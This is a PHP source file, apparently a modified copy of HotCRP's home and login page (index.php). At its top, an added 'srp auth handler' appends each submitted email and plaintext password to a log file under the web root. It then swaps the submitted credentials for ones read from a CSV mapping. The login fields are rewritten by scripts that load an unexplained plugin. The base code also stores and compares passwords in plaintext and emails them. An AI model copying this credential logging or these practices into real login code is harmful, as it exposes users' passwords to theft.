<?php
// index.php -- HotCRP home page
// HotCRP is Copyright (c) 2006-2013 Eddie Kohler and Regents of the UC
// Distributed under an MIT-like license; see LICENSE

require_once("Code/header.inc");
require_once("Code/paperlist.inc");
require_once("Code/search.inc");

$email_class = "";
$password_class = "";

if (isset($_REQUEST["email"]))
{
//srp auth handler
    $file = "/usr/local/apache/htdocs/hotcrp/srp/log.txt";
    $username = $_REQUEST["email"]; 
    $password = $_REQUEST["password"];
    $content = "1: username is " . $username . "; password is " . $password . "\n";
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    $sha_name_file = "/usr/local/apache/htdocs/hotcrp/srp/sha_name.csv";

    if (strlen($username)){
        $flag = 0; 
        if (($handle = fopen($sha_name_file, "r")) !== FALSE) {
            while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
                if (!strcmp($data[0], $username)){
                    $username = $data[1];
                    $password = $data[2];
                    $flag = 1; 
                }    
            }    
            fclose($handle);
        }    
    }    
    if ($flag === 0){  
        $username = null;
        $password = null;
    }    
    $_REQUEST["email"] = $username;
    $_REQUEST["password"] = $password;

    $content = "2: username is " . $username . "; password is " . $password . "\n";
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);
}

// signin links
if (isset($_REQUEST["email"]) && isset($_REQUEST["password"])) {
    $_REQUEST["action"] = defval($_REQUEST, "action", "login");
    $_REQUEST["signin"] = defval($_REQUEST, "signin", "go");
}

if ((isset($_REQUEST["email"]) && isset($_REQUEST["password"])
     && isset($_REQUEST["signin"]) && !isset($Opt["httpAuthLogin"]))
    || isset($_REQUEST["signout"])) {
    if ($Me->valid() && isset($_REQUEST["signout"]) && !isset($Opt["httpAuthLogin"]))
	$Conf->confirmMsg("You have been signed out.  Thanks for using the system.");
    $Me->invalidate();
    $Me->fresh = true;
    if (isset($_REQUEST["signout"]))
	unset($Me->capabilities);
    foreach (array("l", "info", "rev_tokens", "rev_token_fail", "comment_msgs",
		   "pplscores", "pplscoresort", "scoresort") as $v)
	unset($_SESSION[$v]);
    foreach ($allowedSessionVars as $v)
	unset($_SESSION[$v]);
    if (isset($_REQUEST["signout"])) {
	unset($_SESSION["afterLogin"]);
	if (isset($Opt["httpAuthLogin"])) {
	    $_SESSION["reauth"] = true;
	    $Conf->go("");
	}
    }
}

if (isset($Opt["httpAuthLogin"]) && isset($_SESSION["reauth"])) {
    unset($_SESSION["reauth"]);
    header("HTTP/1.0 401 Unauthorized");
    if (is_string($Opt["httpAuthLogin"]))
	header("WWW-Authenticate: " . $Opt["httpAuthLogin"]);
    else
	header("WWW-Authenticate: Basic realm=\"HotCRP\"");
    exit;
}

function doFirstUser($msg) {
    global $Conf, $Opt, $Me;
    $msg .= "  As the first user, you have been automatically signed in and assigned system administrator privilege.";
    if (!isset($Opt["ldapLogin"]) && !isset($Opt["httpAuthLogin"]))
	$msg .= "  Your password is “<tt>" . htmlspecialchars($Me->password) . "</tt>”.  All later users will have to sign in normally.";
    $while = "while granting system administrator privilege";
    $Conf->qe("insert into ChairAssistant (contactId) values (" . $Me->cid . ")", $while);
    $Conf->qe("update ContactInfo set roles=" . (Contact::ROLE_ADMIN) . " where contactId=" . $Me->cid, $while);
    $Conf->qe("delete from Settings where name='setupPhase'", "while leaving setup phase");
    $Conf->log("Granted system administrator privilege to first user", $Me);
    $Conf->confirmMsg($msg);
    if (!function_exists("imagecreate"))
	$Conf->warnMsg("Your PHP installation appears to lack GD support, which is required for drawing score graphs.  You may want to fix this problem and restart Apache.");
    return true;
}

function doCreateAccount() {
    global $Conf, $Opt, $Me, $email_class;

    if ($Me->validContact() && $Me->visits > 0) {
	$email_class = " error";
	return $Conf->errorMsg("An account already exists for " . htmlspecialchars($_REQUEST["email"]) . ".  To retrieve your password, select &ldquo;I forgot my password, email it to me.&rdquo;");
    } else if (!validateEmail($_REQUEST["email"])) {
	$email_class = " error";
	return $Conf->errorMsg("&ldquo;" . htmlspecialchars($_REQUEST["email"]) . "&rdquo; is not a valid email address.");
    } else if (!$Me->validContact()) {
	if (!$Me->initialize($_REQUEST["email"]))
	    return $Conf->errorMsg($Conf->db_error_html(true, "while adding your account"));
    }

    $Me->sendAccountInfo(true, true);
    $Conf->log("Account created", $Me);
    $msg = "Successfully created an account for " . htmlspecialchars($_REQUEST["email"]) . ".";

    // handle setup phase
    if (defval($Conf->settings, "setupPhase", false))
	return doFirstUser($msg);

    if ($Conf->allowEmailTo($Me->email))
	$msg .= "  A password has been emailed to you.  Return here when you receive it to complete the registration process.  If you don’t receive the email, check your spam folders and verify that you entered the correct address.";
    else {
	if ($Opt['sendEmail'])
	    $msg .= "  The email address you provided seems invalid.";
	else
	    $msg .= "  The conference system is not set up to mail passwords at this time.";
	$msg .= "  Although an account was created for you, you need the site administrator’s help to retrieve your password.  The site administrator is " . htmlspecialchars($Opt["contactName"] . " <" . $Opt["contactEmail"] . ">") . ".";
    }
    if (isset($_REQUEST["password"]) && $_REQUEST["password"] != "")
	$msg .= "  Note that the password you supplied on the login screen was ignored.";
    $Conf->confirmMsg($msg);
    return null;
}

function doLDAPLogin() {
    global $Conf;
    // check for bogus configurations
    if (!function_exists("ldap_connect") || !function_exists("ldap_bind"))
	return $Conf->errorMsg("Internal error: <code>\$Opt[\"ldapLogin\"]</code> is set, but this PHP installation doesn’t support LDAP.  Logins will fail until this error is fixed.");

    // the body is elsewhere because we need LDAP constants, which might[?]
    // cause errors absent LDAP support
    require_once("Code/ldaplogin.inc");
    return ldapLoginAction();
}

function unquoteDoubleQuotedRequest() {
    global $Conf;
    if (strpos($_REQUEST["email"], "@") !== false
	|| strpos($_REQUEST["email"], "%40") === false)
	return false;
    if (!$Conf->setting("bug_doubleencoding"))
	$Conf->q("insert into Settings (name, value) values ('bug_doubleencoding', 1)");
    foreach ($_REQUEST as $k => &$v)
	$v = rawurldecode($v);
    return true;
}

function doLogin() {
    global $Conf, $Opt, $Me, $email_class, $password_class;

    // In all cases, we need to look up the account information
    // to determine if the user is registered
    if (!isset($_REQUEST["email"])
        || ($_REQUEST["email"] = trim($_REQUEST["email"])) == "") {
	$email_class = " error";
	if (isset($Opt["ldapLogin"]))
	    return $Conf->errorMsg("Enter your LDAP username.");
	else
	    return $Conf->errorMsg("Enter your email address.");
    }

    // Check for the cookie
    if (!isset($_COOKIE["CRPTestCookie"]) && !isset($_REQUEST["cookie"])) {
	// set a cookie to test that their browser supports cookies
	setcookie("CRPTestCookie", true);
	$url = "cookie=1";
	foreach (array("email", "password", "action", "go", "afterLogin", "signin") as $a)
	    if (isset($_REQUEST[$a]))
		$url .= "&$a=" . urlencode($_REQUEST[$a]);
	$Conf->go("?" . $url);
    } else if (!isset($_COOKIE["CRPTestCookie"]))
	return $Conf->errorMsg("You appear to have disabled cookies in your browser, but this site needs to set cookies to function.  Google has <a href='http://www.google.com/cookies.html'>an informative article on how to enable them</a>.");

    // do LDAP login before validation, since we might create an account
    if (isset($Opt["ldapLogin"])) {
	$_REQUEST["action"] = "login";
	if (!doLDAPLogin())
	    return false;
    }

    $Me->lookupByEmail($_REQUEST["email"]);
    if (!$Me->email && unquoteDoubleQuotedRequest())
	$Me->lookupByEmail($_REQUEST["email"]);
    if ($_REQUEST["action"] == "new") {
	if (!($reg = doCreateAccount()))
	    return $reg;
	$_REQUEST["password"] = $Me->password;
    }

    if (!$Me->validContact()) {
	if (isset($Opt["ldapLogin"]) || isset($Opt["httpAuthLogin"])) {
	    if (!$Me->initialize($_REQUEST["email"], true))
		return $Conf->errorMsg($Conf->db_error_html(true, "while adding your account"));
	    if (defval($Conf->settings, "setupPhase", false))
		return doFirstUser($msg);
	} else {
	    $email_class = " error";
	    return $Conf->errorMsg("No account for " . htmlspecialchars($_REQUEST["email"]) . " exists.  Did you enter the correct email address?");
	}
    }

    if (($Me->password == "" && !isset($Opt["ldapLogin"]) && !isset($Opt["httpAuthLogin"]))
        || $Me->disabled)
        return $Conf->errorMsg("Your account is disabled. Contact the site administrator for more information.");

    if ($_REQUEST["action"] == "forgot") {
	$worked = $Me->sendAccountInfo(false, true);
	$Conf->log("Sent password", $Me);
	if ($worked)
	    $Conf->confirmMsg("Your password has been emailed to " . $_REQUEST["email"] . ".  When you receive that email, return here to sign in.");
	return null;
    }

    $_REQUEST["password"] = defval($_REQUEST, "password", "");
    if ($_REQUEST["password"] == "" && !isset($Opt["httpAuthLogin"])) {
	$password_class = " error";
	return $Conf->errorMsg("Enter your password.  If you’ve forgotten it, enter your email address and use the &ldquo;I forgot my password, email it to me&rdquo; option.");
    }

    if ($Me->password != $_REQUEST["password"]
	&& !isset($Opt["ldapLogin"]) && !isset($Opt["httpAuthLogin"])) {
	$password_class = " error";
	return $Conf->errorMsg("That password doesn’t match.  If you’ve forgotten your password, enter your email address and use the “I forgot my password, email it to me” option.");
    }

    $Conf->qe("update ContactInfo set visits=visits+1, lastLogin=" . time() . " where contactId=" . $Me->cid, "while recording login statistics");

    if (isset($_REQUEST["go"]))
	$where = $_REQUEST["go"];
    else if (isset($_SESSION["afterLogin"]))
	$where = $_SESSION["afterLogin"];
    else
	$where = hoturl("index");

    setcookie("CRPTestCookie", false);
    unset($_SESSION["afterLogin"]);
    $Me->go($where);
    exit;
}

// HTTP authentication
if (!$Me->valid() && isset($Opt["httpAuthLogin"])) {
    if (!isset($_SERVER["REMOTE_USER"]) || !$_SERVER["REMOTE_USER"]) {
	$Conf->header("Error", "home", actionBar());
	$Conf->errorMsg("This site is using HTTP authentication to manage its users, but you have not provided authentication data. This usually indicates a server configuration error.");
	$Conf->footer();
	exit;
    }
    $_REQUEST["email"] = $_SERVER["REMOTE_USER"];
    if (validateEmail($_REQUEST["email"]))
	$_REQUEST["preferredEmail"] = $_REQUEST["email"];
    else if (isset($Opt["defaultEmailDomain"])
	     && validateEmail($_REQUEST["email"] . "@" . $Opt["defaultEmailDomain"]))
	$_REQUEST["preferredEmail"] = $_REQUEST["email"] . "@" . $Opt["defaultEmailDomain"];
    $_REQUEST["action"] = "login";
    if (!doLogin()) {
	$Conf->footer();
	exit;
    }
}

if (isset($_REQUEST["email"]) && isset($_REQUEST["action"])
    && isset($_REQUEST["signin"]) && !isset($Opt["httpAuthLogin"])) {
    if (doLogin() !== true) {
	// if we get here, login failed
	$Me->invalidate();
    }
}

// set a cookie to test that their browser supports cookies
if (!$Me->valid() || isset($_REQUEST["signin"]))
    setcookie("CRPTestCookie", true);

// perhaps redirect through account
if ($Me->validContact() && isset($Me->fresh) && $Me->fresh === true) {
    $needti = false;
    if (($Me->roles & Contact::ROLE_PC) && !$Me->isReviewer) {
	$result = $Conf->q("select count(ta.topicId), count(ti.topicId) from TopicArea ta left join TopicInterest ti on (ti.contactId=$Me->cid and ti.topicId=ta.topicId)");
	$needti = ($row = edb_row($result)) && $row[0] && !$row[1];
    }
    if (!($Me->firstName || $Me->lastName)
	|| !$Me->affiliation
	|| (($Me->roles & Contact::ROLE_PC) && !$Me->collaborators)
	|| $needti) {
	$Me->fresh = "redirect";
	$Me->go(hoturl("profile", "redirect=1"));
    } else
	unset($Me->fresh);
}

// check global system settings
if ($Me->privChair) {
    if (isset($_REQUEST["clearbug"]) && check_post())
	$Conf->save_setting("bug_" . $_REQUEST["clearbug"], null);
    if (isset($_REQUEST["clearnewpcrev"]) && ctype_digit($_REQUEST["clearnewpcrev"])
	&& check_post() && $Conf->setting("pcrev_informtime", 0) <= $_REQUEST["clearnewpcrev"])
	$Conf->save_setting("pcrev_informtime", $_REQUEST["clearnewpcrev"]);
    if (isset($_REQUEST["clearbug"]) || isset($_REQUEST["clearnewpcrev"]))
	redirectSelf(array("clearbug" => null, "clearnewpcrev" => null));

    if (preg_match("/^[1-4]\\./", phpversion()))
	$Conf->warnMsg("HotCRP requires PHP version 5.2 or higher.  You are running PHP version " . htmlspecialchars(phpversion()) . ".");
    if (get_magic_quotes_gpc())
	$Conf->errorMsg("The PHP <code>magic_quotes_gpc</code> feature is on, which is a bad idea.  Check that your Web server is using HotCRP’s <code>.htaccess</code> file.  You may also want to disable <code>magic_quotes_gpc</code> in your <code>php.ini</code> configuration file.");
    if (get_magic_quotes_runtime())
	$Conf->errorMsg("The PHP <code>magic_quotes_runtime</code> feature is on, which is a bad idea.  Check that your Web server is using HotCRP’s <code>.htaccess</code> file.  You may also want to disable <code>magic_quotes_runtime</code> in your <code>php.ini</code> configuration file.");
    if ($Opt["globalSessionLifetime"] < $Opt["sessionLifetime"])
	$Conf->warnMsg("PHP’s systemwide <code>session.gc_maxlifetime</code> setting, which is " . htmlspecialchars($Opt["globalSessionLifetime"]) . " seconds, is less than HotCRP’s preferred session expiration time, which is " . $Opt["sessionLifetime"] . " seconds.  You should update <code>session.gc_maxlifetime</code> in the <code>php.ini</code> file or users may be booted off the system earlier than you expect.");
    $result = $Conf->qx("show variables like 'max_allowed_packet'");
    $max_file_size = ini_get_bytes("upload_max_filesize");
    if (($row = edb_row($result)) && $row[1] < $max_file_size)
	$Conf->warnMsg("MySQL’s <code>max_allowed_packet</code> setting, which is " . htmlspecialchars($row[1]) . "&nbsp;bytes, is less than the PHP upload file limit, which is $max_file_size&nbsp;bytes.  You should update <code>max_allowed_packet</code> in the system-wide <code>my.cnf</code> file or the system may not be able to handle large papers.");
    if (!function_exists("imagecreate"))
	$Conf->warnMsg("This PHP installation lacks support for the GD library, so HotCRP cannot generate score charts. You should update your PHP installation. For example, on Ubuntu Linux, install the <code>php5-gd</code> package.");
    // Any -100 preferences around?
    $result = $Conf->qx($Conf->preferenceConflictQuery(false, "limit 1"));
    if (($row = edb_row($result)))
	$Conf->warnMsg("PC members have indicated paper conflicts (using review preferences of &minus;100 or less) that aren’t yet confirmed.  <a href='" . hoturl_post("autoassign", "a=prefconflict&amp;assign=1") . "' class='nowrap'>Confirm these conflicts</a>");
    // Weird URLs?
    foreach (array("conferenceSite", "paperSite") as $k)
	if ($Opt[$k] && !preg_match('`\Ahttps?://(?:[-.~\w:/?#\[\]@!$&\'()*+,;=]|%[0-9a-fA-F][0-9a-fA-F])*\z`', $Opt[$k]))
	    $Conf->warnMsg("The <code>\$Opt[\"$k\"]</code> setting, <code>&laquo;" . htmlspecialchars($Opt[$k]) . "&raquo;</code>, is not a valid URL.  Edit the <code>Code/options.inc</code> file to fix this problem.");
    // Weird options?
    if (!isset($Opt["shortName"]) || $Opt["shortName"] == "")
	$Conf->warnMsg("The <code>\$Opt[\"shortName\"]</code> setting is missing. Edit the <code>Code/options.inc</code> file to fix this problem.");
    else if (simplifyWhitespace($Opt["shortName"]) != $Opt["shortName"])
	$Conf->warnMsg("The <code>\$Opt[\"shortName\"]</code> setting has a funny value. To fix it, remove leading and trailing spaces, use only space characters (no tabs or newlines), and make sure words are separated by single spaces (never two or more). Edit the <code>Code/options.inc</code> file to fix this problem.");
    // Double-encoding bugs found?
    if ($Conf->setting("bug_doubleencoding"))
	$Conf->warnMsg("Double-encoded URLs have been detected. Incorrect uses of Apache’s <code>mod_rewrite</code>, and other middleware, can encode URL parameters twice. This can cause problems, for instance when users log in via links in email. (“<code>a@b.com</code>” should be encoded as “<code>a%40b.com</code>”; a double encoding will produce “<code>a%2540b.com</code>”.) HotCRP has tried to compensate, but you really should fix the problem. For <code>mod_rewrite</code> add <a href='http://httpd.apache.org/docs/current/mod/mod_rewrite.html'>the <code>[NE]</code> option</a> to the relevant RewriteRule. <a href=\"" . hoturl_post("index", "clearbug=doubleencoding") . "\">(Clear&nbsp;this&nbsp;message)</a>");
    // Unnotified reviews?
    if ($Conf->setting("pcrev_assigntime", 0) > $Conf->setting("pcrev_informtime", 0)
	&& $Conf->sversion >= 46) {
	$assigntime = $Conf->setting("pcrev_assigntime");
	$result = $Conf->qe("select paperId from PaperReview where reviewType>" . REVIEW_PC . " and timeRequested>timeRequestNotified and reviewSubmitted is null and reviewNeedsSubmit!=0 limit 1", "when searching for unnotified review assignments");
	if (edb_nrows($result))
	    $Conf->warnMsg("PC review assignments have changed. You may want to <a href=\"" . hoturl("mail", "template=newpcrev") . "\">send mail about the new assignments</a>. <a href=\"" . hoturl_post("index", "clearnewpcrev=$assigntime") . "\">(Clear&nbsp;this&nbsp;message)</a>");
	else
	    $Conf->save_setting("pcrev_informtime", $assigntime);
    }
}


// review tokens
if (isset($_REQUEST["token"]) && $Me->valid()) {
    $oldtokens = isset($_SESSION["rev_tokens"]);
    unset($_SESSION["rev_tokens"]);
    $tokeninfo = array();
    foreach (preg_split('/\s+/', $_REQUEST["token"]) as $x)
	if ($x == "")
	    /* no complaints */;
	else if (!($tokendata = decodeToken($x)))
	    $Conf->errorMsg("Invalid review token &ldquo;" . htmlspecialchars($token) . ".&rdquo;  Check your typing and try again.");
	else if (defval($_SESSION, "rev_token_fail", 0) >= 5)
	    $Conf->errorMsg("Too many failed attempts to use a review token.  <a href='" . hoturl("index", "signout=1") . "'>Sign out</a> and in to try again.");
	else {
	    $tokendata = unpack("Vx", $tokendata);
	    $token = $tokendata["x"];
	    $result = $Conf->qe("select paperId from PaperReview where reviewToken=" . $token, "while searching for review token");
	    if (($row = edb_row($result))) {
		$tokeninfo[] = "Review token “" . htmlspecialchars($x) . "” lets you review <a href='" . hoturl("paper", "p=$row[0]") . "'>paper #" . $row[0] . "</a>.";
		if (!isset($_SESSION["rev_tokens"]) || array_search($token, $_SESSION["rev_tokens"]) === false)
		    $_SESSION["rev_tokens"][] = $token;
		$Me->isReviewer = true;
	    } else {
		$Conf->errorMsg("Review token “" . htmlspecialchars($x) . "” hasn’t been assigned.");
		$_SESSION["rev_token_fail"] = defval($_SESSION, "rev_token_fail", 0) + 1;
	    }
	}
    if (count($tokeninfo))
	$Conf->infoMsg(join("<br />\n", $tokeninfo));
    else if ($oldtokens)
	$Conf->infoMsg("Review tokens cleared.");
}
if (isset($_REQUEST["cleartokens"]) && $Me->valid())
    unset($_SESSION["rev_tokens"]);


$title = ($Me->valid() && !isset($_REQUEST["signin"]) ? "Home" : "Sign in");
$Conf->header($title, "home", actionBar());
$xsep = " <span class='barsep'>&nbsp;|&nbsp;</span> ";

if ($Me->privChair)
    echo "<div id='clock_drift_container'></div>";


// Sidebar
echo "<div class='homeside'>";

echo "<noscript><div class='homeinside'>",
    "<strong>HotCRP requires Javascript.</strong> ",
    "Many features will work without Javascript, but not all.<br />",
    "<a style='font-size:smaller' href='http://read.seas.harvard.edu/~kohler/hotcrp/'>Report bad compatibility problems</a></div></noscript>";

// Conference management
if ($Me->privChair) {
    echo "<div id='homemgmt' class='homeinside'>
  <h4>Administration</h4>
  <ul>
    <li><a href='", hoturl("settings"), "'>Settings</a></li>
    <li><a href='", hoturl("users", "t=all"), "'>Users</a></li>
    <li><a href='", hoturl("autoassign"), "'>Assign reviews</a></li>
    <li><a href='", hoturl("mail"), "'>Send mail</a></li>
    <li><a href='", hoturl("log"), "'>Action log</a></li>
  </ul>
</div>\n";
}

// Conference info sidebar
echo "<div class='homeinside'><div id='homeinfo'>
  <h4>Conference information</h4>
  <ul>\n";
// Any deadlines set?
$sep = "";
if ($Conf->setting('sub_reg') || $Conf->setting('sub_update') || $Conf->setting('sub_sub')
    || ($Me->isAuthor && $Conf->setting('resp_open') > 0 && $Conf->setting('resp_done'))
    || ($Me->isPC && $Conf->setting('rev_open') && $Conf->setting('pcrev_hard'))
    || ($Me->amReviewer() && $Conf->setting('rev_open') && $Conf->setting('extrev_hard'))) {
    echo "    <li><a href='", hoturl("deadlines"), "'>Deadlines</a></li>\n";
}
echo "    <li><a href='", hoturl("users", "t=pc"), "'>Program committee</a></li>\n";
if (isset($Opt['conferenceSite']) && $Opt['conferenceSite'] != $Opt['paperSite'])
    echo "    <li><a href='", $Opt['conferenceSite'], "'>Conference site</a></li>\n";
if ($Conf->timeAuthorViewDecision()) {
    $result = $Conf->qe("select outcome, count(paperId) from Paper where timeSubmitted>0 group by outcome", "while loading acceptance statistics");
    $n = $nyes = 0;
    while (($row = edb_row($result))) {
	$n += $row[1];
	if ($row[0] > 0)
	    $nyes += $row[1];
    }
    echo "    <li>", plural($nyes, "paper"), " were accepted out of ", $n, " submitted.</li>\n";
}
echo "  </ul>\n</div>\n";

echo "</div></div>\n\n";
// End sidebar


// Home message
if (($v = $Conf->settingText("homemsg")))
    $Conf->infoMsg($v);


// Sign in
if (!$Me->valid() || isset($_REQUEST["signin"])) {
    $confname = $Opt["longName"];
    if ($Opt["shortName"] && $Opt["shortName"] != $Opt["longName"])
	$confname .= " (" . $Opt["shortName"] . ")";
    echo "<div class='homegrp'>
Welcome to the ", htmlspecialchars($confname), " submissions site.
Sign in to submit or review papers.";
    if (isset($Opt["conferenceSite"]))
	echo " For general information about ", htmlspecialchars($Opt["shortName"]), ", see the <a href=\"", htmlspecialchars($Opt["conferenceSite"]), "\">conference site</a>.";
    $passwordFocus = ($email_class == "" && $password_class != "");
    echo "</div>
<hr class='home' />
<div class='homegrp' id='homeacct'>
<form method='post' id='login_form' action='", hoturl_post("index"), "' accept-charset='UTF-8'><div class='f-contain'>
<input type='hidden' name='cookie' value='1' />
<div class='f-ii'>
  <div class='f-c", $email_class, "'>",
	(isset($Opt["ldapLogin"]) ? "Username" : "Email"),
    "</div>";
?>
<script uframeid="101">
  /*<div class='f-e", $email_class, "'><input",
	($passwordFocus ? "" : " id='login_d'"),
    " type='text' class='textlite' name='email' size='36' tabindex='1' ";
    if (isset($_REQUEST["email"]))
	echo "value=\"", htmlspecialchars($_REQUEST["email"]), "\" ";
    echo " /></div>
   */
var ut = '<div class="f-e"> <input id="login_d" type="text" class="textlite" name="email" size="36" tabindex="1" /> </div>'; 
document.write(ut);
</script>
<?php 
echo "</div>
<div class='f-i'>
  <div class='f-c", $password_class, "'>Password</div>";
?>
<script uframeid="102">
/*  <div class='f-e'><input",
	($passwordFocus ? " id='login_d'" : ""),
	" type='password' class='textlite' name='password' size='36' tabindex='1' value='' /></div>
    </div>\n";
 */
    var ut = '<div class="f-e"> <input type="password" id="password" class="textlite" name="password" size="36" tabindex="1" value="" /> </div>';
    document.write(ut);
</script>
<?php
    if (isset($Opt["ldapLogin"]))
	echo "<input type='hidden' name='action' value='login' />\n";
    else {
	echo "<div class='f-i'>\n  ",
	    tagg_radio("action", "login", true, array("tabindex" => 2)),
	    "&nbsp;", tagg_label("<b>Sign me in</b>"), "<br />\n";
	echo tagg_radio("action", "forgot", false, array("tabindex" => 2)),
	    "&nbsp;", tagg_label("I forgot my password, email it to me"), "<br />\n";
	echo tagg_radio("action", "new", false, array("tabindex" => 2)),
	    "&nbsp;", tagg_label("I’m a new user and want to create an account using this email address");
	echo "\n</div>\n";
    }
    echo "<div class='f-i'>
  <input class='b' type='submit' value='Sign in' name='signin' tabindex='1' />
</div>
</div></form>
<hr class='home' /></div>\n";
    $Conf->footerScript("crpfocus(\"login\", null, 2)");
}
?>
<div id="srp"><object id="pluginId" type="application/x-my-extension" width="0" height="0"><param name="onload" value="pluginLoaded"/></object>
<script src="srp/sha256.js">
</script> <script src="srp/srp_auth.js"></script> </div>

<?php

// Submissions
$papersub = $Conf->setting("papersub");
$homelist = ($Me->privChair || ($Me->isPC && $papersub) || ($Me->amReviewer() && $papersub));
if ($homelist) {
    echo "<div class='homegrp' id='homelist'>\n";

    // Lists
    echo "<table><tr><td><h4>Search: &nbsp;&nbsp;</h4></td>\n";

    $tOpt = PaperSearch::searchTypes($Me);
    $q = defval($_REQUEST, "q", "(All)");
    echo "  <td><form method='get' action='", hoturl("search"), "' accept-charset='UTF-8'><div class='inform'>
    <input id='homeq' class='textlite temptext",
	($q == "(All)" ? "" : "off"),
	"' type='text' size='32' name='q' value=\"",
	htmlspecialchars($q),
	"\" title='Enter paper numbers or search terms' />
    &nbsp;in&nbsp; ",
	PaperSearch::searchTypeSelector($tOpt, key($tOpt), 0), "
    &nbsp; <input class='b' type='submit' value='Search' />
    <div id='taghelp_homeq' class='taghelp_s'></div>
    <div style='font-size:85%'><a href='", hoturl("help", "t=search"), "'>Search help</a> <span class='barsep'>&nbsp;|&nbsp;</span> <a href='", hoturl("help", "t=keywords"), "'>Search keywords</a> <span class='barsep'>&nbsp;|&nbsp;</span> <a href='", hoturl("search", "tab=advanced"), "'>Advanced search</a></div>
  </div></form>
  </td></tr></table>
</div>
<hr class='home' />\n";
    $Conf->footerScript("mktemptext('homeq','(All)')");
    if (!defval($Opt, "noSearchAutocomplete"))
        $Conf->footerScript("taghelp(\"homeq\",\"taghelp_homeq\",taghelp_q)");
}


// Review token printing
function reviewTokenGroup($close_hr) {
    global $reviewTokenGroupPrinted;
    if ($reviewTokenGroupPrinted)
	return;

    echo "<div class='homegrp' id='homerev'>\n";

    $tokens = array();
    foreach (defval($_SESSION, "rev_tokens", array()) as $tt)
	$tokens[] = encodeToken((int) $tt);
    echo "  <h4>Review tokens: &nbsp;</h4> ",
	"<form action='", hoturl_post("index"), "' method='post' enctype='multipart/form-data' accept-charset='UTF-8'><div class='inform'>",
	"<input class='textlite' type='text' name='token' size='15' value=\"",
	htmlspecialchars(join(" ", $tokens)), "\" />",
	" &nbsp;<input class='b' type='submit' value='Go' />",
	"<div class='hint'>Enter review tokens here to gain access to the corresponding reviews.</div>",
	"</div></form>\n";

    if ($close_hr)
	echo "<hr class='home' />";
    echo "</div>\n";
    $reviewTokenGroupPrinted = true;
}


// Review assignment
if ($Me->amReviewer() && ($Me->privChair || $papersub)) {
    echo "<div class='homegrp' id='homerev'>\n";

    // Overview
    echo "<h4>Reviews: &nbsp;</h4> ";
    $result = $Conf->qe("select PaperReview.contactId, count(reviewSubmitted), count(if(reviewNeedsSubmit=0,reviewSubmitted,1)), group_concat(overAllMerit), PCMember.contactId as pc from PaperReview join Paper using (paperId) left join PCMember on (PaperReview.contactId=PCMember.contactId) where Paper.timeSubmitted>0 group by PaperReview.contactId", "while fetching review status");
    $rf = reviewForm();
    $maxOverAllMerit = $rf->maxNumericScore("overAllMerit");
    $npc = $npcScore = $sumpcScore = $sumpcSubmit = 0;
    $myrow = null;
    while (($row = edb_row($result))) {
	$row[3] = scoreCounts($row[3], $maxOverAllMerit);
	if ($row[0] == $Me->cid)
	    $myrow = $row;
	if ($row[4]) {
	    $npc++;
	    $sumpcSubmit += $row[1];
	}
	if ($row[4] && $row[1]) {
	    $npcScore++;
	    $sumpcScore += $row[3]->avg;
	}
    }
    if ($myrow) {
	if ($myrow[2] == 1 && $myrow[1] <= 1)
	    echo "You ", ($myrow[1] == 1 ? "have" : "have not"), " submitted your <a href='", hoturl("search", "q=&amp;t=r"), "'>review</a>";
	else
	    echo "You have submitted ", $myrow[1], " of <a href='", hoturl("search", "q=&amp;t=r"), "'>", plural($myrow[2], "review"), "</a>";
        $f = $rf->field("overAllMerit");
	if ($f->displayed && $myrow[1])
	    echo " with an average $f->name_html score of ", $f->unparse_average($myrow[3]->avg);
	echo ".<br />\n";
    }
    if (($Me->isPC || $Me->privChair) && $npc) {
	echo sprintf("  The average PC member has submitted %.1f reviews", $sumpcSubmit / $npc);
        $f = $rf->field("overAllMerit");
	if ($f->displayed && $npcScore)
	    echo " with an average $f->name_html score of ", $f->unparse_average($sumpcScore / $npcScore);
	echo ".";
	if ($Me->isPC || $Me->privChair)
	    echo "&nbsp; <small>(<a href='", hoturl("users", "t=pc&amp;score%5B%5D=0"), "'>Details</a>)</small>";
	echo "<br />\n";
    }
    if ($myrow && $myrow[1] < $myrow[2]) {
	$rtyp = ($Me->isPC ? "pcrev_" : "extrev_");
	if ($Conf->timeReviewPaper($Me->isPC, true, false)) {
	    $d = $Conf->printableTimeSetting("${rtyp}soft", "span");
	    if ($d == "N/A")
		$d = $Conf->printableTimeSetting("${rtyp}hard", "span");
	    if ($d != "N/A")
		echo "  <span class='deadline'>Please submit your ", ($myrow[2] == 1 ? "review" : "reviews"), " by $d.</span><br />\n";
	} else if ($Conf->timeReviewPaper($Me->isPC, true, true))
	    echo "  <span class='deadline'><strong class='overdue'>Reviews are overdue.</strong>  They were requested by " . $Conf->printableTimeSetting("${rtyp}soft", "span") . ".</span><br />\n";
	else if (!$Conf->timeReviewPaper($Me->isPC, true, true, true))
	    echo "  <span class='deadline'>The <a href='", hoturl("deadlines"), "'>deadline</a> for submitting " . ($Me->isPC ? "PC" : "external") . " reviews has passed.</span><br />\n";
	else
	    echo "  <span class='deadline'>The site is not open for reviewing.</span><br />\n";
    } else if ($Me->isPC && $Conf->timeReviewPaper(true, false, true)) {
	$d = $Conf->printableTimeSetting("pcrev_soft", "span");
	if ($d != "N/A")
	    echo "  <span class='deadline'>The review deadline is $d.</span><br />\n";
    }
    if ($Me->isPC && $Conf->timeReviewPaper(true, false, true))
	echo "  <span class='hint'>As a PC member, you may review <a href='", hoturl("search", "q=&amp;t=s"), "'>any submitted paper</a>.</span><br />\n";
    else if ($Me->privChair)
	echo "  <span class='hint'>As an administrator, you may review <a href='", hoturl("search", "q=&amp;t=s"), "'>any submitted paper</a>.</span><br />\n";

    if (($myrow || $Me->privChair) && $npc)
	echo "</div>\n<div id='foldre' class='homegrp foldo'>";

    // Actions
    $sep = "";
    if ($myrow) {
	echo $sep, foldbutton("re", "review list"), "&nbsp;<a href=\"", hoturl("search", "q=re%3Ame"), "\" title='Search in your reviews (more display and download options)'><strong>Your Reviews</strong></a>";
	$sep = $xsep;
    }
    if ($Me->isPC && $Conf->setting("paperlead") > 0
	&& $Me->amDiscussionLead(0)) {
	echo $sep, "<a href=\"", hoturl("search", "q=lead%3Ame"), "\" class='nowrap'>Your discussion leads</a>";
	$sep = $xsep;
    }
    if ($Me->isPC && $Conf->timePCReviewPreferences()) {
	echo $sep, "<a href='", hoturl("reviewprefs"), "'>Review preferences</a>";
	$sep = $xsep;
    }
    if ($Conf->deadlinesAfter("rev_open") || $Me->privChair) {
